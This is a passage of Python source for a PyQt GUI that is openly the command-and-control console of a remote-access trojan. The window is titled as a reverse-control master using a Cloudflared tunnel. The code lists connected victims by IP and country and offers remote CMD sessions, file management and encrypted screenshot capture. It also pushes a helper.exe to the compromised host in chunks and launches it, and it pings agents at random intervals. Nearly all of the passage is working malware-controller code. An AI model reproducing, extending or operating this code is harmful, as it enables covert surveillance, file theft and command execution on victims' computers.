        self.log(f"生成新 key: {hexdump_short(self.client.shot_key)}")
        self.client.send_packet(b"SCRS" + self.client.shot_key)
        self.recv_label.setText("已发送 SCRS，等待数据...")
        self.recv_label.setVisible(True)
        self.recv_bar.setValue(0)
        self.recv_bar.setVisible(True)
        self.log("已发送 SCRS（含新密钥）")

    def _reset_recv_state(self):
        self._total = 0
        self._iv = None
        self._chunks_total = 0
        self._chunks = {}
        self.recv_bar.setValue(0)
        self.recv_bar.setVisible(False)
        self.recv_label.setVisible(False)

    # ---------- helper 上传 ----------
    def on_helper_needed(self):
        log_console(f"[截屏] {self.client.display_name} 收到 HNED，需要 helper")
        if self._closing:
            return
        if self.client.helper_uploaded and not self.chk_force_helper.isChecked():
            log_console("[截屏] C2 认为已上传，但 agent 报告缺失，重置状态")
            self.client.helper_uploaded = False
        if self.client.helper_uploading:
            log_console("[截屏] helper 正在上传，忽略")
            return
        self._pending_scrs_after_helper = True
        self._start_upload_helper()

    def _start_upload_helper(self):
        helper_path = os.path.join(self.main_window.base_dir, "helper.exe")
        log_console(f"[截屏] 准备上传 helper: {helper_path}")
        if not os.path.exists(helper_path):
            log_console("[截屏] helper.exe 不存在")
            self.log(f"helper.exe 不存在: {helper_path}")
            self.recv_label.setText("helper.exe 缺失")
            return
        size = os.path.getsize(helper_path)
        self.client.helper_uploading = True
        self._helper_file = open(helper_path, "rb")
        self._helper_total = size
        self._helper_sent = 0
        self._helper_offset = 0
        self._helper_ack_pending = False
        self._helper_waiting_hok0_for_start = True
        self._helper_waiting_hok0_for_done = False
        self.upload_label.setText(f"[上传 helper] 0 / {size} 字节")
        self.upload_label.setVisible(True)
        self.upload_bar.setValue(0)
        self.upload_bar.setVisible(True)
        self.log(f"开始上传 helper, 大小={size}")
        self.client.send_packet(b"HUP0" + struct.pack("<Q", size))

    def on_helper_hok0_start(self):
        log_console("[截屏] 收到 HOK0(start)，开始发 helper 数据")
        self._helper_waiting_hok0_for_start = False
        self._helper_waiting_hok0_for_done = True
        self._send_next_helper_chunk()

    def on_helper_hok0_done(self):
        log_console("[截屏] 收到 HOK0(done)，helper 上传完成")
        self._helper_waiting_hok0_for_done = False
        self.client.helper_uploading = False
        self.client.helper_uploaded = True
        self.upload_bar.setValue(100)
        self.upload_label.setText("[上传 helper] 完成")
        self.log("helper 上传完成，发送 HSTR 启动")
        QTimer.singleShot(300, self._send_hstr)

    def _send_next_helper_chunk(self):
        if self._closing or not self.client.connected:
            log_console("[截屏] 发送 helper 分块：连接已断")
            return
        if self._helper_ack_pending:
            log_console("[截屏] 上一块未 ACK，等")
            return
        if not self._helper_file:
            log_console("[截屏] 无 helper 文件句柄，忽略")
            return
        chunk = self._helper_file.read(HELPER_CHUNK)
        if not chunk:
            self._helper_file.close()
            self._helper_file = None
            log_console(f"[截屏] helper 数据发完，发 HDON")
            self.client.send_packet(b"HDON")
            return
        offset = self._helper_offset
        body = b"HDAT" + struct.pack("<Q", offset) + chunk
        log_console(f"[截屏] 发送 HDAT offset={offset} len={len(chunk)}")
        self.client.send_packet(body)
        self._helper_offset += len(chunk)
        self._helper_sent += len(chunk)
        self._helper_ack_pending = True
        pct = self._helper_sent * 100 // self._helper_total
        self.upload_bar.setValue(pct)
        self.upload_label.setText(
            f"[上传 helper] {self._helper_sent} / {self._helper_total} 字节 ({pct}%)")

    def on_helper_ack(self, offset: bytes):
        off = struct.unpack("<Q", offset)[0] if len(offset) == 8 else -1
        log_console(f"[截屏] 收到 HACK offset={off}")
        self._helper_ack_pending = False
        self._send_next_helper_chunk()

    def _send_hstr(self):
        if self._closing or not self.client.connected:
            return
        log_console("[截屏] 发送 HSTR")
        self.client.send_packet(b"HSTR")

    def on_helper_ready(self):
        log_console("[截屏] 收到 HOK1，helper 就绪")
        self.upload_label.setVisible(False)
        self.upload_bar.setVisible(False)
        if self._pending_scrs_after_helper:
            self._pending_scrs_after_helper = False
            log_console("[截屏] 补发 SCRS（跳过强制上传检查）")
            QTimer.singleShot(200, self._send_scrs)
        else:
            self.recv_label.setText("helper 就绪，可点击刷新截图")

    def on_helper_err(self, msg: str):
        log_console(f"[截屏] HERR: {msg}")
        self.client.helper_uploading = False
        self.upload_label.setText(f"[错误] {msg}")
        self.upload_bar.setVisible(False)
        self._pending_scrs_after_helper = False

    # ---------- 接收截图 ----------
    def on_scr_data(self, sess, body: bytes):
        if self._closing:
            return
        if len(body) < 4:
            log_console(f"[截屏] 收到过短包: {len(body)}")
            return
        cmd = body[0:4]
        payload = body[4:]

        if cmd == b"SCRM":
            if len(payload) >= 4:
                self._total = struct.unpack("<I", payload[0:4])[0]
                self._iv = None
                self._chunks_total = 0
                self._chunks = {}
                self.recv_bar.setValue(0)
                self.recv_bar.setVisible(True)
                self.recv_label.setVisible(True)
                self.recv_label.setText(f"开始接收，总大小 {self._total} 字节")
                log_console(f"[截屏] SCRM total={self._total}")
            else:
                log_console("[截屏] SCRM 载荷不足")
        elif cmd == b"SCRV":
            if len(payload) >= 12:
                self._iv = payload[0:12]
                log_console(f"[截屏] SCRV iv={hexdump_short(self._iv)}")
            else:
                log_console("[截屏] SCRV 载荷不足")
        elif cmd == b"SCRD":
            if len(payload) >= 8:
                idx = struct.unpack("<I", payload[0:4])[0]
                total_chunks = struct.unpack("<I", payload[4:8])[0]
                data = payload[8:]
                if self._chunks_total == 0:
                    self._chunks_total = total_chunks
                    log_console(f"[截屏] 首块，声明总块数={total_chunks}")
                self._chunks[idx] = data
                got = len(self._chunks)
                if self._chunks_total > 0:
                    pct = got * 100 // self._chunks_total
                    if pct > 100: pct = 100
                    self.recv_bar.setValue(pct)
                    self.recv_label.setText(
                        f"接收中 {got}/{self._chunks_total} 块 ({pct}%)")
                log_console(f"[截屏] SCRD idx={idx} size={len(data)} "
                            f"got={got}/{self._chunks_total}")
                if self._chunks_total > 0 and got >= self._chunks_total:
                    log_console("[截屏] 全部块到齐，开始解密")
                    self._finalize_scrx()
            else:
                log_console("[截屏] SCRD 载荷不足")
        elif cmd == b"SCRX":
            log_console(f"[截屏] 收到老格式 SCRX len={len(payload)}")
            if len(payload) >= 16:
                clen = struct.unpack("<I", payload[0:4])[0]
                iv = payload[4:16]
                cipher = payload[16:16+clen]
                if len(cipher) != clen:
                    log_console("[截屏] SCRX 长度不匹配")
                    return
                if not self.client.shot_key or not HAS_AESGCM:
                    log_console("[截屏] 缺少解密条件")
                    return
                try:
                    aesgcm = AESGCM(self.client.shot_key)
                    plain = aesgcm.decrypt(iv, cipher, None)
                    log_console(f"[截屏] SCRX 解密成功 plain_len={len(plain)}")
                except Exception as e:
                    log_console(f"[截屏] SCRX 解密失败: {e}")
                    return
                self._plain = plain
                self._show_plain(plain, "SCRX 老格式")

    def _finalize_scrx(self):
        if not self.client.shot_key:
            log_console("[截屏] 解密失败：无 shot_key")
            self.recv_label.setText("缺少解密密钥")
            return
        if not HAS_AESGCM:
            log_console("[截屏] 解密失败：cryptography 未安装")
            self.recv_label.setText("缺少 cryptography 库")
            return
        if not self._iv:
            log_console("[截屏] 解密失败：无 IV")
            self.recv_label.setText("缺少 iv")
            return
        try:
            cipher = b"".join(self._chunks[i] for i in range(self._chunks_total))
        except KeyError as e:
            log_console(f"[截屏] 分块不完整，缺 idx={e}")
            self.recv_label.setText("分块不完整")
            return
        if len(cipher) != self._total:
            log_console(f"[截屏] 密文长度不匹配 期望={self._total} 实际={len(cipher)}")
            self.recv_label.setText("密文长度不匹配")
            return
        try:
            aesgcm = AESGCM(self.client.shot_key)
            plain = aesgcm.decrypt(self._iv, cipher, None)
            log_console(f"[截屏] 解密成功 plain_len={len(plain)}")
        except Exception as e:
            log_console(f"[截屏] 解密失败: {e}")
            self.recv_label.setText("解密失败")
            return
        self._plain = plain
        self._show_plain(plain, "分块解密")

    def _show_plain(self, plain: bytes, src: str):
        pix = QPixmap()
        if not pix.loadFromData(plain, "PNG"):
            log_console("[截屏] PNG 解码失败，尝试 JPEG")
            if not pix.loadFromData(plain, "JPEG"):
                log_console("[截屏] PNG/JPEG 都失败")
                self.recv_label.setText("图像解码失败")
                return
        self._last_pixmap = pix
        self._display_pixmap()
        self.recv_bar.setValue(100)
        self.recv_label.setText(
            f"完成 {pix.width()}x{pix.height()}，{len(plain)} 字节")
        log_console(f"[截屏] 完成（{src}）尺寸={pix.width()}x{pix.height()} "
                    f"字节={len(plain)}")
        self.btn_save.setEnabled(True)

    def _display_pixmap(self):
        if self._last_pixmap is None:
            return
        w = max(self.image_label.width(), 640)
        h = max(self.image_label.height(), 480)
        scaled = self._last_pixmap.scaled(
            w, h,
            Qt.AspectRatioMode.KeepAspectRatio,
            Qt.TransformationMode.SmoothTransformation)
        self.image_label.setPixmap(scaled)

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self._display_pixmap()

    def save_screenshot(self):
        if not self._plain:
            log_console("[截屏] 保存失败：无数据")
            return
        save_path, _ = QFileDialog.getSaveFileName(
            self, "保存截图", "screenshot.png", "PNG (*.png);;JPEG (*.jpg *.jpeg)")
        if not save_path:
            log_console("[截屏] 保存取消")
            return
        try:
            with open(save_path, "wb") as f:
                f.write(self._plain)
            log_console(f"[截屏] 已保存 {save_path} ({len(self._plain)} 字节)")
        except OSError as e:
            log_console(f"[截屏] 保存失败: {e}")

    def log(self, msg):
        self.log_box.append(msg)
        log_console(f"[截屏 {self.client.display_name}] {msg}")

    def closeEvent(self, event):
        self._closing = True
        if self._helper_file:
            try: self._helper_file.close()
            except Exception: pass
            self._helper_file = None

        # 通知 agent 终止 helper、释放共享内存
        if self.client.connected:
            log_console(f"[截屏] 关闭窗口，发送 SCRE 通知 agent 清理 helper")
            self.client.send_packet(b"SCRE")
        else:
            log_console("[截屏] 关闭窗口，连接已断开，无法通知 agent")

        if self.main_window and self.client in self.main_window.open_screen_dialogs:
            if self.main_window.open_screen_dialogs[self.client] is self:
                del self.main_window.open_screen_dialogs[self.client]
        log_console(f"[截屏] 关闭窗口 {self.client.display_name}")
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        if s.is_service_mode is True:
            mode_str = "服务"
        elif s.is_service_mode is False:
            mode_str = "桌面"
        else:
            mode_str = "未知"
        return QVariant(f"{s.display_name} | 模式:{mode_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        self.is_dark_mode = False
        self.fg_color = "#00ff00"

        self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
        self.resize(720, 520)
        self.server_sock = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs = {}
        self.open_file_dialogs = {}
        self.open_screen_dialogs = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("3306")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听"); self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听"); self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False); top_lay.addWidget(self.btn_stop)
        top_lay.addStretch()
        self.btn_color = QPushButton("🎨 字体颜色")
        self.btn_color.clicked.connect(self.choose_color)
        top_lay.addWidget(self.btn_color)
        self.btn_theme = QPushButton("🌙 夜间模式"); self.btn_theme.clicked.connect(self.toggle_theme)
        top_lay.addWidget(self.btn_theme)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        self.ping_timer = QTimer(self)
        self.ping_timer.setSingleShot(True)
        self.ping_timer.timeout.connect(self.broadcast_ping)

        self.apply_theme(False)
        log_console("[C2] 启动，等待监听")

    def choose_color(self):
        color = QColorDialog.getColor(QColor(self.fg_color), self, "选择字体颜色")
        if color.isValid():
            self.fg_color = color.name()
            log_console(f"[C2] 字体颜色 -> {self.fg_color}")
            self.apply_theme(self.is_dark_mode)

    def apply_theme(self, dark: bool):
        self.is_dark_mode = dark
        fg = self.fg_color
        if dark:
            self.setStyleSheet(f"""
                QMainWindow {{ background-color: {DARK_BG}; }}
                QWidget {{ background-color: {DARK_BG}; color: {fg}; }}
                QLabel {{ color: {fg}; }}
                QCheckBox {{ color: {fg}; }}
                QLineEdit {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    padding: 4px;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QPushButton {{
                    background-color: {DARK_BTN_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    padding: 5px 15px;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QPushButton:hover {{ background-color: {DARK_BTN_HOVER}; }}
                QPushButton:disabled {{ color: {DARK_DISABLED}; }}
                QListView {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QListView::item:selected {{
                    background-color: {DARK_SEL_BG};
                    color: {fg};
                }}
                QTextEdit {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QMenu {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QMenu::item:selected {{
                    background-color: {DARK_SEL_BG};
                    color: {fg};
                }}
                QTreeWidget {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QTreeWidget::item:selected {{
                    background-color: {DARK_SEL_BG};
                    color: {fg};
                }}
                QTreeWidget QHeaderView::section {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    padding: 3px;
                }}
                QProgressBar {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    text-align: center;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QProgressBar::chunk {{ background-color: {DARK_PROGRESS_CHUNK}; }}
                QInputDialog {{ background-color: {DARK_BG}; }}
                QInputDialog QLabel {{ color: {fg}; }}
                QInputDialog QLineEdit {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                }}
                QInputDialog QPushButton {{
                    background-color: {DARK_BTN_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    padding: 4px 12px;
                }}
                QFileDialog {{ background-color: {DARK_BG}; }}
                QFileDialog QLabel {{ color: {fg}; }}
                QFileDialog QLineEdit {{
                    background-color: {DARK_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                }}
                QFileDialog QListView, QFileDialog QTreeView {{
                    background-color: {DARK_BG};
                    color: {fg};
                }}
                QFileDialog QPushButton {{
                    background-color: {DARK_BTN_BG};
                    color: {fg};
                    border: 1px solid {DARK_BORDER};
                    padding: 4px 12px;
                }}
            """)
            self.btn_theme.setText("☀️ 日间模式")
        else:
            self.setStyleSheet("")
            self.btn_theme.setText("🌙 夜间模式")
        for dlg in self.open_cmd_dialogs.values():
            dlg.apply_theme(dark, fg)
        for dlg in self.open_file_dialogs.values():
            dlg.apply_theme(dark, fg)
        for dlg in self.open_screen_dialogs.values():
            dlg.apply_theme(dark, fg)

    def toggle_theme(self):
        self.apply_theme(not self.is_dark_mode)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        log_console(msg)

    @pyqtSlot()
    def broadcast_ping(self):
        n = 0
        for sess in list(self.client_model.items):
            if sess.connected:
                sess.send_packet(b"PING")
                n += 1
        if n:
            log_console(f"[C2] 广播 PING 给 {n} 个客户端")
        next_ms = random.randint(8000, 13000)
        self.ping_timer.start(next_ms)

    def accept_loop(self):
        while self.server_running:
            try:
                raw_conn, addr = self.server_sock.accept()
                log_console(f"[C2] 新 TCP 连接 {addr}")
                ok, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
                if not ok:
                    log_console(f"[C2] 握手失败 {addr}")
                    raw_conn.close(); continue
                if not ip: ip = addr[0]
                if not country: country = "XX"
                if not display_name: display_name = f"[{country}] {ip}"
                sess = ClientSession(raw_conn, ip, country, display_name)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                sess.signals.on_fs.connect(self.handle_session_fs)
                sess.signals.on_screen.connect(self.handle_session_screen)
                sess.signals.on_mode.connect(self.handle_session_mode)
                sess.signals.on_helper_needed.connect(self.handle_helper_needed)
                sess.signals.on_helper_ack.connect(self.handle_helper_ack)
                sess.signals.on_helper_ready.connect(self.handle_helper_ready)
                sess.signals.on_helper_err.connect(self.handle_helper_err)
                self.client_model.add(sess)
                self.log(f"[新接入] {display_name}")
                threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
            except OSError:
                break
            except Exception as e:
                log_console(f"[C2] accept_loop 异常: {e}")
                traceback.print_exc()
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess, text):
        if sess in self.open_cmd_dialogs:
            self.open_cmd_dialogs[sess].append_text(text)

    @pyqtSlot(object, bytes)
    def handle_session_fs(self, sess, body):
        dlg = self.open_file_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg.on_fs_data(sess, body)

    @pyqtSlot(object, bytes)
    def handle_session_screen(self, sess, body):
        dlg = self.open_screen_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg.on_scr_data(sess, body)

    @pyqtSlot(object)
    def handle_session_mode(self, sess):
        self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
        dlg = self.open_screen_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg._update_mode_label()

    @pyqtSlot(object)
    def handle_helper_needed(self, sess):
        dlg = self.open_screen_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg.on_helper_needed()
        else:
            log_console(f"[HNED] {sess.display_name} 但截屏窗口未打开，忽略")

    @pyqtSlot(object, bytes)
    def handle_helper_ack(self, sess, offset):
        dlg = self.open_screen_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg.on_helper_ack(offset)

    @pyqtSlot(object)
    def handle_helper_ready(self, sess):
        dlg = self.open_screen_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg.on_helper_ready()
        else:
            log_console(f"[HOK1] {sess.display_name} 但截屏窗口未打开，忽略")

    @pyqtSlot(object, str)
    def handle_helper_err(self, sess, msg):
        dlg = self.open_screen_dialogs.get(sess)
        if dlg is not None and not dlg._closing:
            dlg.on_helper_err(msg)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess):
        log_console(f"[C2] 断开 {sess.display_name}")
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] WebSocket连接已经断开")
        if sess in self.open_file_dialogs:
            dlg = self.open_file_dialogs.pop(sess)
            dlg._closing = True
            dlg.reset_transfer_state()
            dlg.close()
        if sess in self.open_screen_dialogs:
            dlg = self.open_screen_dialogs.pop(sess)
            dlg._closing = True
            dlg.close()
        try:
            self.client_model.remove_by_obj(sess)
        except ValueError:
            pass

    def client_recv_loop(self, sess):
        buf = sess._recv_buf
        log_console(f"[C2] 接收线程启动 {sess.display_name}")
        while sess.connected:
            try:
                chunk = sess.conn.recv(65536)
                if not chunk:
                    log_console(f"[C2] recv 返回空 {sess.display_name}")
                    break
                buf.extend(chunk)
                while True:
                    fin, opcode, payload, consumed = ws_parse_frame(buf)
                    if consumed <= 0: break
                    del buf[:consumed]

                    if opcode == WS_OP_PING:
                        pong = ws_build_server_frame(True, WS_OP_PONG, payload)
                        with sess._send_lock:
                            sess.conn.sendall(pong)
                        log_console(f"[C2] 回 PONG 给 {sess.display_name}")
                        continue
                    elif opcode == WS_OP_PONG:
                        log_console(f"[C2] 收到 PONG {sess.display_name}")
                        continue
                    elif opcode == WS_OP_CLOSE:
                        log_console(f"[C2] 收到 CLOSE {sess.display_name}")
                        break
                    elif opcode == WS_OP_TEXT:
                        continue
                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                        if opcode == WS_OP_BINARY:
                            sess.reset_fragment()
                            sess._frag_opcode = opcode
                        sess._frag_buf.extend(payload)
                        if fin:
                            full_body = bytes(sess._frag_buf)
                            sess.reset_fragment()
                            if len(full_body) >= 4:
                                body_len = struct.unpack(">I", full_body[0:4])[0]
                                if len(full_body) >= 4 + body_len:
                                    body = full_body[4:4+body_len]
                                    if len(body) >= 4:
                                        cmd_code = body[0:4]
                                        log_console(f"[C2] 收到 {sess.display_name} "
                                                    f"cmd={cmd_code!r} len={len(body)}")
                                        self._dispatch_packet(sess, cmd_code, body)
                                    else:
                                        log_console(f"[C2] {sess.display_name} body 过短")
                                else:
                                    log_console(f"[C2] {sess.display_name} WS 帧不完整 "
                                                f"需要 {4+body_len} 实际 {len(full_body)}")
                            else:
                                log_console(f"[C2] {sess.display_name} 全帧过短 {len(full_body)}")
            except (OSError, ConnectionResetError) as e:
                log_console(f"[C2] recv 异常 {sess.display_name}: {e}")
                break
            except Exception as e:
                log_console(f"[C2] recv 未知异常 {sess.display_name}: {e}")
                traceback.print_exc()
                break
        log_console(f"[C2] 接收线程退出 {sess.display_name}")
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def _dispatch_packet(self, sess, cmd_code, body):
        try:
            if cmd_code == b"PONG":
                sess.last_pong = datetime.now()
                self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
            elif cmd_code == b"OUTP":
                out_text = body[4:].decode("gbk", errors="replace")
                sess.signals.on_outp.emit(sess, out_text)
            elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
                              b"FPRO", b"FDON", b"FACK", b"FOK0", b"FERR"):
                sess.signals.on_fs.emit(sess, body)
            elif cmd_code in (b"SCRM", b"SCRV", b"SCRD", b"SCRX"):
                sess.signals.on_screen.emit(sess, body)
            elif cmd_code == b"MODE":
                if len(body) >= 5:
                    sess.is_service_mode = (body[4] == 0x01)
                    sess.signals.on_mode.emit(sess)
                    log_console(f"[MODE] {sess.display_name} -> "
                                f"{'服务' if sess.is_service_mode else '桌面'}")
            elif cmd_code == b"HNED":
                log_console(f"[HNED] {sess.display_name}")
                sess.signals.on_helper_needed.emit(sess)
            elif cmd_code == b"HACK":
                if len(body) >= 12:
                    offset = body[4:12]
                    sess.signals.on_helper_ack.emit(sess, offset)
            elif cmd_code == b"HOK0":
                dlg = self.open_screen_dialogs.get(sess)
                if dlg is not None:
                    if dlg._helper_waiting_hok0_for_start:
                        log_console(f"[HOK0] {sess.display_name} 开始发数据")
                        dlg.on_helper_hok0_start()
                    elif dlg._helper_waiting_hok0_for_done:
                        log_console(f"[HOK0] {sess.display_name} 上传完成")
                        dlg.on_helper_hok0_done()
                    else:
                        log_console(f"[HOK0] {sess.display_name} 状态异常，忽略")
                else:
                    log_console(f"[HOK0] {sess.display_name} 无截屏窗口，忽略")
            elif cmd_code == b"HOK1":
                log_console(f"[HOK1] {sess.display_name}")
                sess.signals.on_helper_ready.emit(sess)
            elif cmd_code == b"HERR":
                msg = body[4:].decode("gbk", errors="replace") if len(body) > 4 else "unknown"
                log_console(f"[HERR] {sess.display_name}: {msg}")
                sess.signals.on_helper_err.emit(sess, msg)
            else:
                log_console(f"[C2] 未知命令 {cmd_code!r} len={len(body)}")
        except Exception as e:
            log_console(f"[C2] _dispatch_packet 异常: {e}")
            traceback.print_exc()

    def start_server(self):
        try:
            port = int(self.port_edit.text())
        except ValueError:
            log_console("[C2] 端口不合法")
            return
        log_console(f"[C2] 启动监听 127.0.0.1:{port}")
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind(("127.0.0.1", port))
            self.server_sock.listen(8)
        except OSError as e:
            log_console(f"[C2] 监听失败: {e}")
            return
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.ping_timer.start(random.randint(8000, 13000))
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.log(f"启动监听 127.0.0.1:{port}")

    def stop_server(self):
        log_console("[C2] 停止监听")
        self.ping_timer.stop()
        self.server_running = False
        if self.server_sock:
            try: self.server_sock.close()
            except Exception: pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.open_file_dialogs.clear()
        self.open_screen_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("服务器已停止")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid(): return
        sess = self.client_model.items[idx.row()]
        menu = QMenu()
        act_cmd = menu.addAction("打开远程CMD会话")
        act_file = menu.addAction("打开文件管理")
        act_screen = menu.addAction("屏幕截图")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_cmd:
            log_console(f"[C2] 打开 CMD 会话 {sess.display_name}")
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_(); dlg.activateWindow(); return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode, self.fg_color)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()
        elif ret == act_file:
            log_console(f"[C2] 打开文件管理 {sess.display_name}")
            if sess in self.open_file_dialogs:
                dlg = self.open_file_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_(); dlg.activateWindow(); return
                else:
                    dlg._closing = True
                    del self.open_file_dialogs[sess]
            dlg = FileManagerDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode, self.fg_color)
            self.open_file_dialogs[sess] = dlg
            dlg.show()
        elif ret == act_screen:
            log_console(f"[C2] 打开截屏窗口 {sess.display_name}")
            if sess in self.open_screen_dialogs:
                dlg = self.open_screen_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_(); dlg.activateWindow(); return
                else:
                    dlg._closing = True
                    del self.open_screen_dialogs[sess]
            dlg = ScreenPreviewDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode, self.fg_color)
            self.open_screen_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        log_console("[C2] 关闭")
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
